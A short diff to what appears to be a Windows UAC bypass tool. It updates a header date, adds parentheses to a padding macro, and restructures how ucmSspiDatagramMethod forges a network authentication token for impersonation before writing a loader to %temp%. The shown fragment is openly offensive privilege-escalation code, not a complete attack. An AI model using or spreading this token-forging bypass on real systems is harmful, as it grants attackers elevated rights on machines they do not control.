@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.65
 *
-*  DATE:        22 Sep 2023
+*  DATE:        01 Oct 2023
 *
 *  UAC bypass method from antonioCoco.
 *
@@ -37,7 +37,7 @@
 #define MAX_RPC_PACKET_LENGTH 4096
 #define MAX_PROCEDURE_DATA_LENGTH 2048
 
-#define CALC_ALIGN_PADDING(VALUE_LENGTH, ALIGN_BYTES) ((((VALUE_LENGTH + ALIGN_BYTES - 1) / ALIGN_BYTES) * ALIGN_BYTES) - VALUE_LENGTH)
+#define CALC_ALIGN_PADDING(VALUE_LENGTH, ALIGN_BYTES) (((((VALUE_LENGTH) + (ALIGN_BYTES) - 1) / (ALIGN_BYTES)) * (ALIGN_BYTES)) - (VALUE_LENGTH))
 
 // {8a885d04-1ceb-11c9-9fe8-08002b104860} (NDR)
 #define RPC_NDR_UUID (RPC_WSTR)L"8a885d04-1ceb-11c9-9fe8-08002b104860"
@@ -828,13 +828,16 @@ NTSTATUS ucmSspiDatagramMethod(
     HANDLE hToken = NULL;
     WCHAR szLoaderFileName[MAX_PATH * 2];
 
+    //
+    // Forge token for impersonation.
+    //
+    MethodResult = ucmxForgeNetworkAuthToken(&hToken);
+    if (!NT_SUCCESS(MethodResult))
+        return MethodResult;
+
     do {
 
-        //
-        // Forge token for impersonation.
-        //
-        if (!NT_SUCCESS(ucmxForgeNetworkAuthToken(&hToken)))
-            break;
+        MethodResult = STATUS_ACCESS_DENIED;
 
         //
         // Write loader to the %temp%
